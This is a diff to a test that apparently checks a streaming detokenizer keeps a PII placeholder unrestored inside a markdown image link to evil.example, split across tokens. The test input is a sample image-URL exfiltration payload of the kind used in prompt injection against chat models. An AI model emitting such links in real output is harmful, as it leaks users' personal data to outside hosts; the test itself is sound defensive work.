@@ -101,12 +101,12 @@ def test_08t_m3_console_live_url_split_over_entries_stays(database_url, pg, make
     async def body(client, run):
         transform = live_transform(detokenizer(client, run_id))
         out = []
-        for text in ("Bak: ![x](https://evil.example/?q=", "<<PII_1>>) ve <<PII_1>>."):
+        for text in ("Bak: ![x](https://evil.example/?q=", "<<PII_1>>) ve\n<<PII_1>>."):
             out.append((await transform("token", {"text": text}))["text"])
         return "".join(out)
 
     assert _with(database_url, run_id, body) == (
-        f"Bak: ![x](https://evil.example/?q=<<PII_1>>) ve {NAME}."
+        f"Bak: ![x](https://evil.example/?q=<<PII_1>>) ve\n{NAME}."
     )
 
 
